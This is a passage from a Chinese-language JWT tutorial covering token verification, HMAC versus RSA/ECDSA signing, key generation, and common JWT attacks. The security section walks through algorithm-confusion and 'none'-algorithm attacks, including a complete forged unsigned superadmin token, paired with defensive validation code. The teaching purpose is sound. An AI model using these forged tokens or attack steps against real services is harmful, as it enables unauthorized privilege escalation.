</span><span id="__span-71-16"><a id="__codelineno-71-16" name="__codelineno-71-16" href="#__codelineno-71-16"></a><span class="w">    </span><span class="n">Header</span><span class="w"> </span><span class="n">header</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">base64UrlDecode</span><span class="p">(</span><span class="n">encodedHeader</span><span class="p">);</span>
</span><span id="__span-71-17"><a id="__codelineno-71-17" name="__codelineno-71-17" href="#__codelineno-71-17"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">algorithm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">header</span><span class="p">.</span><span class="na">getAlg</span><span class="p">();</span>
</span><span id="__span-71-18"><a id="__codelineno-71-18" name="__codelineno-71-18" href="#__codelineno-71-18"></a>
</span><span id="__span-71-19"><a id="__codelineno-71-19" name="__codelineno-71-19" href="#__codelineno-71-19"></a><span class="w">    </span><span class="c1">// 3. 验证签名</span>
</span><span id="__span-71-20"><a id="__codelineno-71-20" name="__codelineno-71-20" href="#__codelineno-71-20"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">encodedHeader</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;.&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">encodedPayload</span><span class="p">;</span>
</span><span id="__span-71-21"><a id="__codelineno-71-21" name="__codelineno-71-21" href="#__codelineno-71-21"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">expectedSignature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sign</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">secret</span><span class="p">,</span><span class="w"> </span><span class="n">algorithm</span><span class="p">);</span>
</span><span id="__span-71-22"><a id="__codelineno-71-22" name="__codelineno-71-22" href="#__codelineno-71-22"></a>
</span><span id="__span-71-23"><a id="__codelineno-71-23" name="__codelineno-71-23" href="#__codelineno-71-23"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">encodedSignature</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">expectedSignature</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-71-24"><a id="__codelineno-71-24" name="__codelineno-71-24" href="#__codelineno-71-24"></a><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvalidTokenException</span><span class="p">(</span><span class="s">&quot;Invalid signature&quot;</span><span class="p">);</span>
</span><span id="__span-71-25"><a id="__codelineno-71-25" name="__codelineno-71-25" href="#__codelineno-71-25"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-71-26"><a id="__codelineno-71-26" name="__codelineno-71-26" href="#__codelineno-71-26"></a>
</span><span id="__span-71-27"><a id="__codelineno-71-27" name="__codelineno-71-27" href="#__codelineno-71-27"></a><span class="w">    </span><span class="c1">// 4. 解码Payload</span>
</span><span id="__span-71-28"><a id="__codelineno-71-28" name="__codelineno-71-28" href="#__codelineno-71-28"></a><span class="w">    </span><span class="n">Payload</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">base64UrlDecode</span><span class="p">(</span><span class="n">encodedPayload</span><span class="p">);</span>
</span><span id="__span-71-29"><a id="__codelineno-71-29" name="__codelineno-71-29" href="#__codelineno-71-29"></a>
</span><span id="__span-71-30"><a id="__codelineno-71-30" name="__codelineno-71-30" href="#__codelineno-71-30"></a><span class="w">    </span><span class="c1">// 5. 验证Claims</span>
</span><span id="__span-71-31"><a id="__codelineno-71-31" name="__codelineno-71-31" href="#__codelineno-71-31"></a><span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">currentTimeMillis</span><span class="p">()</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">1000</span><span class="p">;</span>
</span><span id="__span-71-32"><a id="__codelineno-71-32" name="__codelineno-71-32" href="#__codelineno-71-32"></a>
</span><span id="__span-71-33"><a id="__codelineno-71-33" name="__codelineno-71-33" href="#__codelineno-71-33"></a><span class="w">    </span><span class="c1">// 检查过期时间</span>
</span><span id="__span-71-34"><a id="__codelineno-71-34" name="__codelineno-71-34" href="#__codelineno-71-34"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="na">getExp</span><span class="p">()</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">now</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-71-35"><a id="__codelineno-71-35" name="__codelineno-71-35" href="#__codelineno-71-35"></a><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TokenExpiredException</span><span class="p">(</span><span class="s">&quot;Token has expired&quot;</span><span class="p">);</span>
</span><span id="__span-71-36"><a id="__codelineno-71-36" name="__codelineno-71-36" href="#__codelineno-71-36"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-71-37"><a id="__codelineno-71-37" name="__codelineno-71-37" href="#__codelineno-71-37"></a>
</span><span id="__span-71-38"><a id="__codelineno-71-38" name="__codelineno-71-38" href="#__codelineno-71-38"></a><span class="w">    </span><span class="c1">// 检查生效时间</span>
</span><span id="__span-71-39"><a id="__codelineno-71-39" name="__codelineno-71-39" href="#__codelineno-71-39"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="na">getNbf</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">now</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-71-40"><a id="__codelineno-71-40" name="__codelineno-71-40" href="#__codelineno-71-40"></a><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TokenNotYetValidException</span><span class="p">(</span><span class="s">&quot;Token not yet valid&quot;</span><span class="p">);</span>
</span><span id="__span-71-41"><a id="__codelineno-71-41" name="__codelineno-71-41" href="#__codelineno-71-41"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-71-42"><a id="__codelineno-71-42" name="__codelineno-71-42" href="#__codelineno-71-42"></a>
</span><span id="__span-71-43"><a id="__codelineno-71-43" name="__codelineno-71-43" href="#__codelineno-71-43"></a><span class="w">    </span><span class="c1">// 检查受众</span>
</span><span id="__span-71-44"><a id="__codelineno-71-44" name="__codelineno-71-44" href="#__codelineno-71-44"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">payload</span><span class="p">.</span><span class="na">getAud</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="n">expectedAudience</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-71-45"><a id="__codelineno-71-45" name="__codelineno-71-45" href="#__codelineno-71-45"></a><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvalidAudienceException</span><span class="p">(</span><span class="s">&quot;Invalid audience&quot;</span><span class="p">);</span>
</span><span id="__span-71-46"><a id="__codelineno-71-46" name="__codelineno-71-46" href="#__codelineno-71-46"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-71-47"><a id="__codelineno-71-47" name="__codelineno-71-47" href="#__codelineno-71-47"></a>
</span><span id="__span-71-48"><a id="__codelineno-71-48" name="__codelineno-71-48" href="#__codelineno-71-48"></a><span class="w">    </span><span class="c1">// 6. 返回用户信息</span>
</span><span id="__span-71-49"><a id="__codelineno-71-49" name="__codelineno-71-49" href="#__codelineno-71-49"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">User</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="na">getSub</span><span class="p">(),</span><span class="w"> </span><span class="n">payload</span><span class="p">.</span><span class="na">getRoles</span><span class="p">());</span>
</span><span id="__span-71-50"><a id="__codelineno-71-50" name="__codelineno-71-50" href="#__codelineno-71-50"></a><span class="p">}</span>
</span></code></pre></div>
<h3 id="24-jwt签名算法详解">2.4 JWT签名算法详解<a class="headerlink" href="#24-jwt签名算法详解" title="链接到此标题">&para;</a></h3>
<h4 id="对称签名hmac">对称签名（HMAC）<a class="headerlink" href="#对称签名hmac" title="链接到此标题">&para;</a></h4>
<p>**原理：**使用同一个密钥进行签名和验证</p>
<p><strong>常用算法：</strong>
- <strong>HS256</strong>：HMAC-SHA256（推荐，最常用）
- <strong>HS384</strong>：HMAC-SHA384
- <strong>HS512</strong>：HMAC-SHA512</p>
<p><strong>签名过程：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>签名方生成：
</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>signature = HMACSHA256(data, secretKey)
</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a>
</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a>验证方验证：
</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a>expectedSignature = HMACSHA256(data, secretKey)
</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6" href="#__codelineno-72-6"></a>valid = (signature == expectedSignature)
</span><span id="__span-72-7"><a id="__codelineno-72-7" name="__codelineno-72-7" href="#__codelineno-72-7"></a>
</span><span id="__span-72-8"><a id="__codelineno-72-8" name="__codelineno-72-8" href="#__codelineno-72-8"></a>关键：签名方和验证方使用相同的secretKey
</span></code></pre></div></p>
<p><strong>密钥要求：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>HS256: 至少256位（32字节）
</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>HS384: 至少384位（48字节）
</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3" href="#__codelineno-73-3"></a>HS512: 至少512位（64字节）
</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4" href="#__codelineno-73-4"></a>
</span><span id="__span-73-5"><a id="__codelineno-73-5" name="__codelineno-73-5" href="#__codelineno-73-5"></a>生成强密钥：
</span><span id="__span-73-6"><a id="__codelineno-73-6" name="__codelineno-73-6" href="#__codelineno-73-6"></a>openssl rand -base64 64
</span></code></pre></div></p>
<p><strong>优点：</strong>
- ✅ 性能高（比非对称快10-100倍）
- ✅ 实现简单
- ✅ 密钥管理相对简单</p>
<p><strong>缺点：</strong>
- ❌ 需要共享密钥（所有服务器都有密钥）
- ❌ 密钥泄露风险高
- ❌ 不适合多方验证场景</p>
<p><strong>适用场景：</strong>
- 单体应用或同一组织内的微服务
- 认证服务器和资源服务器在同一信任域</p>
<h4 id="非对称签名rsaecdsa">非对称签名（RSA/ECDSA）<a class="headerlink" href="#非对称签名rsaecdsa" title="链接到此标题">&para;</a></h4>
<p>**原理：**使用私钥签名，公钥验证</p>
<p><strong>常用算法：</strong>
- <strong>RS256</strong>：RSA-SHA256（最常用）
- <strong>RS384</strong>：RSA-SHA384
- <strong>RS512</strong>：RSA-SHA512
- <strong>ES256</strong>：ECDSA-SHA256（更短的密钥，相同安全性）</p>
<p><strong>签名过程：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>认证服务器（持有私钥）：
</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>signature = RSA_Sign(data, privateKey)
</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3" href="#__codelineno-74-3"></a>
</span><span id="__span-74-4"><a id="__codelineno-74-4" name="__codelineno-74-4" href="#__codelineno-74-4"></a>资源服务器（持有公钥）：
</span><span id="__span-74-5"><a id="__codelineno-74-5" name="__codelineno-74-5" href="#__codelineno-74-5"></a>valid = RSA_Verify(data, signature, publicKey)
</span><span id="__span-74-6"><a id="__codelineno-74-6" name="__codelineno-74-6" href="#__codelineno-74-6"></a>
</span><span id="__span-74-7"><a id="__codelineno-74-7" name="__codelineno-74-7" href="#__codelineno-74-7"></a>关键：私钥签名，公钥验证，公钥可以公开分发
</span></code></pre></div></p>
<p><strong>密钥对生成：</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a><span class="c1"># 生成RS256密钥对</span>
</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>openssl<span class="w"> </span>genrsa<span class="w"> </span>-out<span class="w"> </span>private_key.pem<span class="w"> </span><span class="m">2048</span>
</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a>openssl<span class="w"> </span>rsa<span class="w"> </span>-in<span class="w"> </span>private_key.pem<span class="w"> </span>-pubout<span class="w"> </span>-out<span class="w"> </span>public_key.pem
</span><span id="__span-75-4"><a id="__codelineno-75-4" name="__codelineno-75-4" href="#__codelineno-75-4"></a>
</span><span id="__span-75-5"><a id="__codelineno-75-5" name="__codelineno-75-5" href="#__codelineno-75-5"></a><span class="c1"># 生成ES256密钥对（ECDSA）</span>
</span><span id="__span-75-6"><a id="__codelineno-75-6" name="__codelineno-75-6" href="#__codelineno-75-6"></a>openssl<span class="w"> </span>ecparam<span class="w"> </span>-genkey<span class="w"> </span>-name<span class="w"> </span>prime256v1<span class="w"> </span>-noout<span class="w"> </span>-out<span class="w"> </span>ec_private_key.pem
</span><span id="__span-75-7"><a id="__codelineno-75-7" name="__codelineno-75-7" href="#__codelineno-75-7"></a>openssl<span class="w"> </span>ec<span class="w"> </span>-in<span class="w"> </span>ec_private_key.pem<span class="w"> </span>-pubout<span class="w"> </span>-out<span class="w"> </span>ec_public_key.pem
</span></code></pre></div></p>
<p><strong>优点：</strong>
- ✅ 私钥只在认证服务器，安全性高
- ✅ 公钥可以分发给所有资源服务器
- ✅ 适合多方验证
- ✅ 支持密钥轮换</p>
<p><strong>缺点：</strong>
- ❌ 性能较低（比HMAC慢10-100倍）
- ❌ 实现复杂
- ❌ 密钥管理复杂（需要PKI）</p>
<p><strong>适用场景：</strong>
- 微服务架构（多个资源服务器）
- 第三方API访问
- 需要公开验证Token的场景</p>
<h4 id="算法选择建议">算法选择建议<a class="headerlink" href="#算法选择建议" title="链接到此标题">&para;</a></h4>
<div class="language-text highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>场景1：单体应用或内部微服务
</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a>推荐：HS256
</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a>理由：性能高，实现简单，密钥管理容易
</span><span id="__span-76-4"><a id="__codelineno-76-4" name="__codelineno-76-4" href="#__codelineno-76-4"></a>
</span><span id="__span-76-5"><a id="__codelineno-76-5" name="__codelineno-76-5" href="#__codelineno-76-5"></a>场景2：多租户SaaS平台
</span><span id="__span-76-6"><a id="__codelineno-76-6" name="__codelineno-76-6" href="#__codelineno-76-6"></a>推荐：RS256
</span><span id="__span-76-7"><a id="__codelineno-76-7" name="__codelineno-76-7" href="#__codelineno-76-7"></a>理由：每个租户可以有独立的密钥对，公钥分发
</span><span id="__span-76-8"><a id="__codelineno-76-8" name="__codelineno-76-8" href="#__codelineno-76-8"></a>
</span><span id="__span-76-9"><a id="__codelineno-76-9" name="__codelineno-76-9" href="#__codelineno-76-9"></a>场景3：移动应用 + 后端API
</span><span id="__span-76-10"><a id="__codelineno-76-10" name="__codelineno-76-10" href="#__codelineno-76-10"></a>推荐：RS256
</span><span id="__span-76-11"><a id="__codelineno-76-11" name="__codelineno-76-11" href="#__codelineno-76-11"></a>理由：公钥可以内置在移动应用中验证
</span><span id="__span-76-12"><a id="__codelineno-76-12" name="__codelineno-76-12" href="#__codelineno-76-12"></a>
</span><span id="__span-76-13"><a id="__codelineno-76-13" name="__codelineno-76-13" href="#__codelineno-76-13"></a>场景4：对性能要求极高
</span><span id="__span-76-14"><a id="__codelineno-76-14" name="__codelineno-76-14" href="#__codelineno-76-14"></a>推荐：ES256（ECDSA）
</span><span id="__span-76-15"><a id="__codelineno-76-15" name="__codelineno-76-15" href="#__codelineno-76-15"></a>理由：比RSA更快，密钥更短，安全性相同
</span><span id="__span-76-16"><a id="__codelineno-76-16" name="__codelineno-76-16" href="#__codelineno-76-16"></a>
</span><span id="__span-76-17"><a id="__codelineno-76-17" name="__codelineno-76-17" href="#__codelineno-76-17"></a>⚠️ 避免使用 alg: &quot;none&quot;（无签名），存在安全风险！
</span></code></pre></div>
<h3 id="25-jwt安全性深入">2.5 JWT安全性深入<a class="headerlink" href="#25-jwt安全性深入" title="链接到此标题">&para;</a></h3>
<h4 id="常见安全问题">常见安全问题<a class="headerlink" href="#常见安全问题" title="链接到此标题">&para;</a></h4>
<p><strong>问题1：算法混淆攻击（Algorithm Confusion）</strong></p>
<p><strong>攻击原理：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>1. 攻击者获取公钥（公钥是公开的）
</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a>2. 修改Header：alg: &quot;RS256&quot; → &quot;HS256&quot;
</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a>3. 使用公钥作为HMAC密钥签名Token
</span><span id="__span-77-4"><a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a>4. 服务器用公钥验证HMAC签名 → 通过！
</span></code></pre></div></p>
<p><strong>攻击示例：</strong>
<div class="language-json highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="c1">// 原始Token（RS256）</span>
</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a><span class="err">Header</span><span class="p">:</span><span class="w">  </span><span class="p">{</span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;RS256&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;JWT&quot;</span><span class="p">}</span>
</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3" href="#__codelineno-78-3"></a><span class="err">Payload</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;sub&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user123&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;role&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user&quot;</span><span class="p">}</span>
</span><span id="__span-78-4"><a id="__codelineno-78-4" name="__codelineno-78-4" href="#__codelineno-78-4"></a><span class="err">Sig</span><span class="kc">nature</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="err">RS</span><span class="mi">256</span><span class="err">签名</span><span class="p">]</span>
</span><span id="__span-78-5"><a id="__codelineno-78-5" name="__codelineno-78-5" href="#__codelineno-78-5"></a>
</span><span id="__span-78-6"><a id="__codelineno-78-6" name="__codelineno-78-6" href="#__codelineno-78-6"></a><span class="c1">// 攻击后的Token（改为HS256）</span>
</span><span id="__span-78-7"><a id="__codelineno-78-7" name="__codelineno-78-7" href="#__codelineno-78-7"></a><span class="err">Header</span><span class="p">:</span><span class="w">  </span><span class="p">{</span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HS256&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;JWT&quot;</span><span class="p">}</span>
</span><span id="__span-78-8"><a id="__codelineno-78-8" name="__codelineno-78-8" href="#__codelineno-78-8"></a><span class="err">Payload</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;sub&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user123&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;role&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">}</span><span class="w">  </span><span class="c1">// 提升权限！</span>
</span><span id="__span-78-9"><a id="__codelineno-78-9" name="__codelineno-78-9" href="#__codelineno-78-9"></a><span class="err">Sig</span><span class="kc">nature</span><span class="p">:</span><span class="w"> </span><span class="err">HMAC(da</span><span class="kc">ta</span><span class="p">,</span><span class="w"> </span><span class="err">publicKey)</span><span class="w">  </span><span class="c1">// 用公钥作为密钥</span>
</span></code></pre></div></p>
<p><strong>防护措施：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a><span class="c1">// ❌ 错误：信任Header中的算法</span>
</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">validateToken</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">jwt</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3" href="#__codelineno-79-3"></a><span class="w">    </span><span class="n">Header</span><span class="w"> </span><span class="n">header</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parseHeader</span><span class="p">(</span><span class="n">jwt</span><span class="p">);</span>
</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4" href="#__codelineno-79-4"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">alg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">header</span><span class="p">.</span><span class="na">getAlg</span><span class="p">();</span><span class="w">  </span><span class="c1">// 从Token中读取</span>
</span><span id="__span-79-5"><a id="__codelineno-79-5" name="__codelineno-79-5" href="#__codelineno-79-5"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">verify</span><span class="p">(</span><span class="n">jwt</span><span class="p">,</span><span class="w"> </span><span class="n">alg</span><span class="p">);</span><span class="w">       </span><span class="c1">// 危险！</span>
</span><span id="__span-79-6"><a id="__codelineno-79-6" name="__codelineno-79-6" href="#__codelineno-79-6"></a><span class="p">}</span>
</span><span id="__span-79-7"><a id="__codelineno-79-7" name="__codelineno-79-7" href="#__codelineno-79-7"></a>
</span><span id="__span-79-8"><a id="__codelineno-79-8" name="__codelineno-79-8" href="#__codelineno-79-8"></a><span class="c1">// ✅ 正确：强制指定算法</span>
</span><span id="__span-79-9"><a id="__codelineno-79-9" name="__codelineno-79-9" href="#__codelineno-79-9"></a><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">validateToken</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">jwt</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-79-10"><a id="__codelineno-79-10" name="__codelineno-79-10" href="#__codelineno-79-10"></a><span class="w">    </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">EXPECTED_ALG</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;RS256&quot;</span><span class="p">;</span><span class="w">  </span><span class="c1">// 硬编码</span>
</span><span id="__span-79-11"><a id="__codelineno-79-11" name="__codelineno-79-11" href="#__codelineno-79-11"></a><span class="w">    </span><span class="n">Header</span><span class="w"> </span><span class="n">header</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parseHeader</span><span class="p">(</span><span class="n">jwt</span><span class="p">);</span>
</span><span id="__span-79-12"><a id="__codelineno-79-12" name="__codelineno-79-12" href="#__codelineno-79-12"></a>
</span><span id="__span-79-13"><a id="__codelineno-79-13" name="__codelineno-79-13" href="#__codelineno-79-13"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">EXPECTED_ALG</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">header</span><span class="p">.</span><span class="na">getAlg</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-79-14"><a id="__codelineno-79-14" name="__codelineno-79-14" href="#__codelineno-79-14"></a><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecurityException</span><span class="p">(</span><span class="s">&quot;Algorithm not allowed&quot;</span><span class="p">);</span>
</span><span id="__span-79-15"><a id="__codelineno-79-15" name="__codelineno-79-15" href="#__codelineno-79-15"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-79-16"><a id="__codelineno-79-16" name="__codelineno-79-16" href="#__codelineno-79-16"></a>
</span><span id="__span-79-17"><a id="__codelineno-79-17" name="__codelineno-79-17" href="#__codelineno-79-17"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">verify</span><span class="p">(</span><span class="n">jwt</span><span class="p">,</span><span class="w"> </span><span class="n">EXPECTED_ALG</span><span class="p">);</span>
</span><span id="__span-79-18"><a id="__codelineno-79-18" name="__codelineno-79-18" href="#__codelineno-79-18"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>问题2：None算法攻击</strong></p>
<p><strong>攻击原理：</strong>
<div class="language-json highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a><span class="c1">// 攻击者修改Header</span>
</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a><span class="p">{</span>
</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3" href="#__codelineno-80-3"></a><span class="w">  </span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;none&quot;</span><span class="p">,</span><span class="w">  </span><span class="c1">// 无签名！</span>
</span><span id="__span-80-4"><a id="__codelineno-80-4" name="__codelineno-80-4" href="#__codelineno-80-4"></a><span class="w">  </span><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;JWT&quot;</span>
</span><span id="__span-80-5"><a id="__codelineno-80-5" name="__codelineno-80-5" href="#__codelineno-80-5"></a><span class="p">}</span>
</span><span id="__span-80-6"><a id="__codelineno-80-6" name="__codelineno-80-6" href="#__codelineno-80-6"></a>
</span><span id="__span-80-7"><a id="__codelineno-80-7" name="__codelineno-80-7" href="#__codelineno-80-7"></a><span class="c1">// 伪造的Payload</span>
</span><span id="__span-80-8"><a id="__codelineno-80-8" name="__codelineno-80-8" href="#__codelineno-80-8"></a><span class="p">{</span>
</span><span id="__span-80-9"><a id="__codelineno-80-9" name="__codelineno-80-9" href="#__codelineno-80-9"></a><span class="w">  </span><span class="nt">&quot;sub&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">,</span>
</span><span id="__span-80-10"><a id="__codelineno-80-10" name="__codelineno-80-10" href="#__codelineno-80-10"></a><span class="w">  </span><span class="nt">&quot;role&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;superadmin&quot;</span>
</span><span id="__span-80-11"><a id="__codelineno-80-11" name="__codelineno-80-11" href="#__codelineno-80-11"></a><span class="p">}</span>
</span><span id="__span-80-12"><a id="__codelineno-80-12" name="__codelineno-80-12" href="#__codelineno-80-12"></a>
</span><span id="__span-80-13"><a id="__codelineno-80-13" name="__codelineno-80-13" href="#__codelineno-80-13"></a><span class="c1">// Token格式：Header.Payload.（签名为空）</span>
</span><span id="__span-80-14"><a id="__codelineno-80-14" name="__codelineno-80-14" href="#__codelineno-80-14"></a><span class="err">eyJhbGciOiJub</span><span class="mi">25</span><span class="err">lIiwidHlwIjoiSldUI</span><span class="kc">n</span><span class="mf">0.e</span><span class="err">yJzdWIiOiJhZG</span><span class="mi">1</span><span class="err">pbiIsI</span><span class="kc">n</span><span class="err">JvbGUiOiJzdXBlcmFkbWluI</span><span class="kc">n</span><span class="mf">0.</span>
</span></code></pre></div></p>
<p><strong>防护措施：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a><span class="c1">// ✅ 拒绝none算法</span>
</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">validateToken</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">jwt</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
